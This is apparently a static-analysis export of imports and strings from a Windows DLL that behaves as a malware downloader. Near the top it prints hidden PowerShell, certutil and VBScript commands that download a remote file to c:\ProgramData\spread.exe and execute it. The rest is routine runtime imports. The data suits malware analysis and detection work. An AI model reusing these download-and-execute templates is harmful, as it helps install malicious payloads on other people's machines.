reference_vaddr	symbol_addr	symbol_type	caller_function	data
0x180001038	0x18000c278	import	0x180001000	WS2_32.dll.WSAStartup
0x180001043	0x180013528	string	0x180001000	127.0.0.1
0x18000104f	0x18000c248	import	0x180001000	WS2_32.dll.inet_addr
0x180001066	0x18000c270	import	0x180001000	WS2_32.dll.socket
0x180001072	0x18000c260	import	0x180001000	WS2_32.dll.htons
0x180001089	0x18000c258	import	0x180001000	WS2_32.dll.connect
0x18000109b	0x18000c250	import	0x180001000	WS2_32.dll.closesocket
0x1800010a1	0x18000c268	import	0x180001000	WS2_32.dll.WSACleanup
0x18000113a	0x1800131b0	string	0x1800010e0	c:/ProgramData/spread.exe
0x180001144	0x1800131d0	string	0x1800010e0	cmd /c powershell.exe -windowstyle hidden (new-object System.Net.WebClient).DownloadFile('%s', '%s');%s
0x180001155	0x18000c238	import	0x1800010e0	USER32.dll.wsprintfA
0x180001162	0x18000c028	import	0x1800010e0	KERNEL32.dll.WinExec
0x18000116d	0x18000c000	import	0x1800010e0	KERNEL32.dll.Sleep
0x180001173	0x180013238	string	0x1800010e0	c:\ProgramData\spread.exe
0x18000117d	0x18000c008	import	0x1800010e0	KERNEL32.dll.GetFileAttributesA
0x1800011c1	0x180013258	string	0x1800010e0	cmd /c certutil.exe -urlcache -split -f %s %s&&%s
0x1800011cd	0x18000c238	import	0x1800010e0	USER32.dll.wsprintfA
0x1800011da	0x18000c028	import	0x1800010e0	KERNEL32.dll.WinExec
0x1800011e5	0x18000c000	import	0x1800010e0	KERNEL32.dll.Sleep
0x1800011ee	0x18000c008	import	0x1800010e0	KERNEL32.dll.GetFileAttributesA
0x1800011f9	0x180013550	string	0x1800010e0	URLDownloadToFil
0x180001244	0x18000c010	import	0x1800010e0	KERNEL32.dll.LoadLibraryA
0x180001255	0x18000c018	import	0x1800010e0	KERNEL32.dll.GetProcAddress
0x180001279	0x18000c020	import	0x1800010e0	KERNEL32.dll.FreeLibrary
0x180001281	0x180013290	string	0x1800010e0	cmd /c c:\ProgramData\spread.exe
0x180001288	0x18000c028	import	0x1800010e0	KERNEL32.dll.WinExec
0x180001291	0x18000c008	import	0x1800010e0	KERNEL32.dll.GetFileAttributesA
0x1800012cd	0x1800132b8	string	0x1800010e0	cmd /c echo on error resume next >c:\ProgramData\vbs.vbs
0x1800012d4	0x18000c028	import	0x1800010e0	KERNEL32.dll.WinExec
0x1800012df	0x18000c000	import	0x1800010e0	KERNEL32.dll.Sleep
0x1800012e7	0x180013300	string	0x1800010e0	cmd /c echo with wscript:if .arguments.count^<2 then .quit:end if >>c:\ProgramData\vbs.vbs
0x1800012ee	0x18000c028	import	0x1800010e0	KERNEL32.dll.WinExec
0x1800012f9	0x18000c000	import	0x1800010e0	KERNEL32.dll.Sleep
0x180001301	0x180013360	string	0x1800010e0	cmd /c echo set aso=.createobject("adodb.stream"):set web=createobject("microsoft.xmlhttp") >>c:\ProgramData\vbs.vbs
0x180001308	0x18000c028	import	0x1800010e0	KERNEL32.dll.WinExec
0x180001313	0x18000c000	import	0x1800010e0	KERNEL32.dll.Sleep
0x18000131b	0x1800133e0	string	0x1800010e0	cmd /c echo web.open "get",.arguments(0),0:web.send:if web.status^>200 then quit >>c:\ProgramData\vbs.vbs
0x180001322	0x18000c028	import	0x1800010e0	KERNEL32.dll.WinExec
0x18000132d	0x18000c000	import	0x1800010e0	KERNEL32.dll.Sleep
0x180001335	0x180013450	string	0x1800010e0	cmd /c echo aso.type=1:aso.open:aso.write web.responsebody:aso.savetofile .arguments(1),2:end with >>c:\ProgramData\vbs.vbs
0x18000133c	0x18000c028	import	0x1800010e0	KERNEL32.dll.WinExec
0x180001347	0x18000c000	import	0x1800010e0	KERNEL32.dll.Sleep
0x18000134d	0x1800134d0	string	0x1800010e0	c:\ProgramData\spread.exe
0x180001357	0x1800134f0	string	0x1800010e0	cmd /c cscript c:\ProgramData\vbs.vbs
0x180001363	0x180013518	string	0x1800010e0	%s %s %s
0x18000136f	0x18000c238	import	0x1800010e0	USER32.dll.wsprintfA
0x18000137c	0x18000c028	import	0x1800010e0	KERNEL32.dll.WinExec
0x180001387	0x18000c000	import	0x1800010e0	KERNEL32.dll.Sleep
0x180001390	0x18000c008	import	0x1800010e0	KERNEL32.dll.GetFileAttributesA
0x1800013e3	0x180013538	string	0x1800013d0	C:\ProgramData\
0x1800013ea	0x18000c288	import	0x1800013d0	imagehlp.dll.MakeSureDirectoryPathExists
0x1800013f0	0x1800158e0	string	0x1800013d0	0xCCCCCC8Dsb361
0x1800017db	0x18000c090	import	0x1800017d0	KERNEL32.dll.SetUnhandledExceptionFilter
0x1800017e4	0x18000c088	import	0x1800017d0	KERNEL32.dll.UnhandledExceptionFilter
0x1800017ea	0x18000c098	import	0x1800017d0	KERNEL32.dll.GetCurrentProcess
0x1800017fd	0x18000c0a0	import	0x1800017d0	KERNEL32.dll.TerminateProcess
0x180001829	0x1800019f8	string	0x1800017d0	@SVWH
0x180001995	0x18000c070	import	0x180001988	KERNEL32.dll.RtlCaptureContext
0x1800019ad	0x18000c078	import	0x180001988	KERNEL32.dll.RtlLookupFunctionEntry
0x1800019e4	0x18000c080	import	0x180001988	KERNEL32.dll.RtlVirtualUnwind
0x180001a03	0x18000c070	import	0x1800019f8	KERNEL32.dll.RtlCaptureContext
0x180001a1d	0x18000c078	import	0x1800019f8	KERNEL32.dll.RtlLookupFunctionEntry
0x180001a54	0x18000c080	import	0x1800019f8	KERNEL32.dll.RtlVirtualUnwind
0x180001e74	0x18000c0c8	import	0x180001e48	KERNEL32.dll.GetSystemTimeAsFileTime
0x180001e82	0x18000c0c0	import	0x180001e48	KERNEL32.dll.GetCurrentThreadId
0x180001e8e	0x18000c0b8	import	0x180001e48	KERNEL32.dll.GetCurrentProcessId
0x180001e9e	0x18000c0b0	import	0x180001e48	KERNEL32.dll.QueryPerformanceCounter
0x180001efb	0x18000c0d0	import	0x180001ef4	KERNEL32.dll.InitializeSListHead
0x180001f91	0x18000c070	import	0x180001f4c	KERNEL32.dll.RtlCaptureContext
0x180001fab	0x18000c078	import	0x180001f4c	KERNEL32.dll.RtlLookupFunctionEntry
0x180001fec	0x18000c080	import	0x180001f4c	KERNEL32.dll.RtlVirtualUnwind
0x180002040	0x18000c0d8	import	0x180001f4c	KERNEL32.dll.IsDebuggerPresent
0x180002061	0x18000c090	import	0x180001f4c	KERNEL32.dll.SetUnhandledExceptionFilter
0x18000206c	0x18000c088	import	0x180001f4c	KERNEL32.dll.UnhandledExceptionFilter
0x1800025ae	0x18000c0f8	import	0x180002578	KERNEL32.dll.InterlockedFlushSList
0x180002893	0x18000c100	import	0x180002874	KERNEL32.dll.GetLastError
0x180002913	0x18000c108	import	0x180002874	KERNEL32.dll.SetLastError
0x1800029f7	0x18000c120	import	0x1800029d8	KERNEL32.dll.DeleteCriticalSection
0x180002abc	0x18000c150	import	0x180002a10	KERNEL32.dll.LoadLibraryExW
0x180002acf	0x18000c100	import	0x180002a10	KERNEL32.dll.GetLastError
0x180002ae2	0x18000c150	import	0x180002a10	KERNEL32.dll.LoadLibraryExW
0x180002b1f	0x18000c020	import	0x180002a10	KERNEL32.dll.FreeLibrary
0x180002b53	0x18000c018	import	0x180002a10	KERNEL32.dll.GetProcAddress
0x180002be5	0x18000c410	string	0x180002bd8	FlsAlloc
0x180002bf8	0x18000c410	string	0x180002bd8	FlsAlloc
0x180002c1b	0x18000c130	import	0x180002bd8	KERNEL32.dll.TlsAlloc
0x180002c38	0x18000c428	string	0x180002c2c	FlsFree
0x180002c4b	0x18000c428	string	0x180002c2c	FlsFree
0x180002c6f	0x18000c148	import	0x180002c2c	KERNEL32.dll.TlsFree
0x180002c8c	0x18000c438	string	0x180002c80	FlsGetValue
0x180002c9f	0x18000c438	string	0x180002c80	FlsGetValue
0x180002cc3	0x18000c138	import	0x180002c80	KERNEL32.dll.TlsGetValue
0x180002ce6	0x18000c450	string	0x180002cd4	FlsSetValue
0x180002cef	0x18000c450	string	0x180002cd4	FlsSetValue
0x180002d25	0x18000c140	import	0x180002cd4	KERNEL32.dll.TlsSetValue
0x180002d53	0x18000c468	string	0x180002d3c	InitializeCriticalSectionEx
0x180002d66	0x18000c468	string	0x180002d3c	InitializeCriticalSectionEx
0x180002d98	0x18000c128	import	0x180002d3c	KERNEL32.dll.InitializeCriticalSectionAndSpinCount
0x180002e1e	0x18000c020	import	0x180002e00	KERNEL32.dll.FreeLibrary
0x180003100	0x18000c0e8	import	0x1800030cc	KERNEL32.dll.GetModuleHandleW
0x18000326c	0x18000c098	import	0x180003244	KERNEL32.dll.GetCurrentProcess
0x180003277	0x18000c0a0	import	0x180003244	KERNEL32.dll.TerminateProcess
0x180003286	0x18000c158	import	0x180003244	KERNEL32.dll.ExitProcess
0x1800032a7	0x18000cee8	string	0x180003290	mscoree.dll
0x1800032b0	0x18000c160	import	0x180003290	KERNEL32.dll.GetModuleHandleExW
0x1800032bf	0x18000cf00	string	0x180003290	CorExitProcess
0x1800032c6	0x18000c018	import	0x180003290	KERNEL32.dll.GetProcAddress
0x1800032eb	0x18000c020	import	0x180003290	KERNEL32.dll.FreeLibrary
0x180003593	0x18000c168	import	0x180003548	KERNEL32.dll.GetModuleFileNameA
0x1800037d9	0x180003786	string	0x18000372c	A86taH
0x180003f42	0x18000c180	import	0x180003f2c	KERNEL32.dll.HeapFree
0x180003f54	0x18000c100	import	0x180003f2c	KERNEL32.dll.GetLastError
0x180003faa	0x18000c188	import	0x180003f6c	KERNEL32.dll.HeapAlloc
0x1800040d9	0x18000c188	import	0x180004084	KERNEL32.dll.HeapAlloc
0x180004552	0x18000c100	import	0x180004548	KERNEL32.dll.GetLastError
0x1800045ba	0x18000c108	import	0x180004548	KERNEL32.dll.SetLastError
0x1800045eb	0x18000c100	import	0x1800045dc	KERNEL32.dll.GetLastError
0x180004655	0x18000c108	import	0x1800045dc	KERNEL32.dll.SetLastError
0x18000465f	0x18000c108	import	0x1800045dc	KERNEL32.dll.SetLastError
0x180004736	0x18000c110	import	0x180004724	KERNEL32.dll.EnterCriticalSection
0x18000475f	0x18000c120	import	0x180004740	KERNEL32.dll.DeleteCriticalSection
0x18000478a	0x18000c118	import	0x180004778	KERNEL32.dll.LeaveCriticalSection
0x180004830	0x18000c150	import	0x180004794	KERNEL32.dll.LoadLibraryExW
0x18000483e	0x18000c100	import	0x180004794	KERNEL32.dll.GetLastError
0x180004851	0x18000c150	import	0x180004794	KERNEL32.dll.LoadLibraryExW
0x18000488a	0x18000c020	import	0x180004794	KERNEL32.dll.FreeLibrary
0x1800048b6	0x18000c018	import	0x180004794	KERNEL32.dll.GetProcAddress
0x180004954	0x18000c410	string	0x180004934	FlsAlloc
0x180004978	0x18000c130	import	0x180004934	KERNEL32.dll.TlsAlloc
0x1800049ab	0x18000c428	string	0x18000498c	FlsFree
0x1800049d0	0x18000c148	import	0x18000498c	KERNEL32.dll.TlsFree
0x180004a03	0x18000c438	string	0x1800049e4	FlsGetValue
0x180004a28	0x18000c138	import	0x1800049e4	KERNEL32.dll.TlsGetValue
0x180004a57	0x18000c450	string	0x180004a3c	FlsSetValue
0x180004a8e	0x18000c140	import	0x180004a3c	KERNEL32.dll.TlsSetValue
0x180004ace	0x18000c468	string	0x180004aa4	InitializeCriticalSectionEx
0x180004b01	0x18000c128	import	0x180004aa4	KERNEL32.dll.InitializeCriticalSectionAndSpinCount
0x180004b3d	0x18000d580	string	0x180004b1c	LCMapStringEx
0x180004b4e	0x18000d580	string	0x180004b1c	LCMapStringEx
0x180004bea	0x18000c190	import	0x180004b1c	KERNEL32.dll.LCMapStringW
0x180004c1d	0x18000d598	string	0x180004c0c	LocaleNameToLCID
0x180004c27	0x18000d598	string	0x180004c0c	LocaleNameToLCID
0x180004cca	0x18000d558	string	0x180004cac	GetCurrentPackageId
0x180004cdd	0x18000d558	string	0x180004cac	GetCurrentPackageId
0x180004df1	0x18000c070	import	0x180004d78	KERNEL32.dll.RtlCaptureContext
0x180004e09	0x18000c078	import	0x180004d78	KERNEL32.dll.RtlLookupFunctionEntry
0x180004e44	0x18000c080	import	0x180004d78	KERNEL32.dll.RtlVirtualUnwind
0x180004e7d	0x18000c0d8	import	0x180004d78	KERNEL32.dll.IsDebuggerPresent
0x180004e87	0x18000c090	import	0x180004d78	KERNEL32.dll.SetUnhandledExceptionFilter
0x180004e92	0x18000c088	import	0x180004d78	KERNEL32.dll.UnhandledExceptionFilter
0x180004fd1	0x18000c098	import	0x180004fa4	KERNEL32.dll.GetCurrentProcess
0x180004fe3	0x18000c0a0	import	0x180004fa4	KERNEL32.dll.TerminateProcess
0x1800054c4	0x18000c1a0	import	0x1800053f4	KERNEL32.dll.FindFirstFileExA
0x1800054ee	0x18000c198	import	0x1800053f4	KERNEL32.dll.FindClose
0x1800055cd	0x180005601	string	0x1800055a0	H+1H
0x1800058ea	0x18000c1c0	import	0x1800058c0	KERNEL32.dll.GetOEMCP
0x180005901	0x18000c1b8	import	0x1800058c0	KERNEL32.dll.GetACP
0x180005a06	0x18000c1c8	import	0x1800059d0	KERNEL32.dll.GetCPInfo
0x180005a88	0x180007a20	string	0x1800059d0	@UATAUAVAWH
0x180005ece	0x18000c1b0	import	0x180005e54	KERNEL32.dll.IsValidCodePage
0x180005ee3	0x18000c1c8	import	0x180005e54	KERNEL32.dll.GetCPInfo
0x18000618c	0x18000c1d0	import	0x180006174	KERNEL32.dll.GetCommandLineA
0x180006199	0x18000c1d8	import	0x180006174	KERNEL32.dll.GetCommandLineW
0x1800061c9	0x18000c1e0	import	0x1800061b0	KERNEL32.dll.GetEnvironmentStringsW
0x18000622b	0x18000c178	import	0x1800061b0	KERNEL32.dll.WideCharToMultiByte
0x180006265	0x18000c178	import	0x1800061b0	KERNEL32.dll.WideCharToMultiByte
0x18000628f	0x18000c1e8	import	0x1800061b0	KERNEL32.dll.FreeEnvironmentStringsW
0x18000639c	0x18000c0e0	import	0x18000637c	KERNEL32.dll.GetStartupInfoW
0x180006407	0x18000c200	import	0x18000637c	KERNEL32.dll.GetFileType
0x1800064da	0x18000c1f8	import	0x180006468	KERNEL32.dll.GetStdHandle
0x1800064f0	0x18000c200	import	0x180006468	KERNEL32.dll.GetFileType
0x180006e4c	0x18000c110	import	0x180006e48	KERNEL32.dll.EnterCriticalSection
0x180006e58	0x18000c118	import	0x180006e54	KERNEL32.dll.LeaveCriticalSection
0x180007a93	0x18000c170	import	0x180007a20	KERNEL32.dll.MultiByteToWideChar
0x180007b5c	0x18000c170	import	0x180007a20	KERNEL32.dll.MultiByteToWideChar
0x180007b76	0x18000c208	import	0x180007a20	KERNEL32.dll.GetStringTypeW
0x180007c5b	0x18000c170	import	0x180007bd4	KERNEL32.dll.MultiByteToWideChar
0x180007d20	0x18000c170	import	0x180007bd4	KERNEL32.dll.MultiByteToWideChar
0x180007eb0	0x18000c178	import	0x180007bd4	KERNEL32.dll.WideCharToMultiByte
0x180007f9c	0x180007bd4	string	0x180007f30	@UATAUAVAWH
0x180008061	0x18000c218	import	0x180008004	KERNEL32.dll.HeapReAlloc
0x180008149	0x18000c120	import	0x180008120	KERNEL32.dll.DeleteCriticalSection
0x180008244	0x18000c110	import	0x180008228	KERNEL32.dll.EnterCriticalSection
0x180008268	0x18000c118	import	0x18000824c	KERNEL32.dll.LeaveCriticalSection
0x1800082ea	0x18000c220	import	0x180008270	KERNEL32.dll.SetStdHandle
0x18000866b	0x18000c120	import	0x1800085f8	KERNEL32.dll.DeleteCriticalSection
0x180008a32	0x18000c060	import	0x1800089e4	KERNEL32.dll.FlushFileBuffers
0x180008a46	0x18000c100	import	0x1800089e4	KERNEL32.dll.GetLastError
0x180008b61	0x18000c058	import	0x180008b04	KERNEL32.dll.GetConsoleCP
0x180008c3d	0x18000c178	import	0x180008b04	KERNEL32.dll.WideCharToMultiByte
0x180008c63	0x18000c068	import	0x180008b04	KERNEL32.dll.WriteFile
0x180008ca2	0x18000c068	import	0x180008b04	KERNEL32.dll.WriteFile
0x180008cda	0x18000c100	import	0x180008b04	KERNEL32.dll.GetLastError
0x180008dc2	0x18000c068	import	0x180008d0c	KERNEL32.dll.WriteFile
0x180008dde	0x18000c100	import	0x180008d0c	KERNEL32.dll.GetLastError
0x180008ee1	0x18000c068	import	0x180008e14	KERNEL32.dll.WriteFile
0x180008efd	0x18000c100	import	0x180008e14	KERNEL32.dll.GetLastError
0x180009016	0x18000c178	import	0x180008f30	KERNEL32.dll.WideCharToMultiByte
0x180009049	0x18000c068	import	0x180008f30	KERNEL32.dll.WriteFile
0x18000906b	0x18000c100	import	0x180008f30	KERNEL32.dll.GetLastError
0x180009298	0x18000c050	import	0x180009190	KERNEL32.dll.GetConsoleMode
0x180009313	0x18000c100	import	0x180009190	KERNEL32.dll.GetLastError
0x1800093c0	0x18000c068	import	0x180009190	KERNEL32.dll.WriteFile
0x1800093ca	0x18000c100	import	0x180009190	KERNEL32.dll.GetLastError
0x180009c05	0x18000c038	import	0x180009bc0	KERNEL32.dll.WriteConsoleW
0x180009ee4	0x180013180	string	0x180009ee0	log10
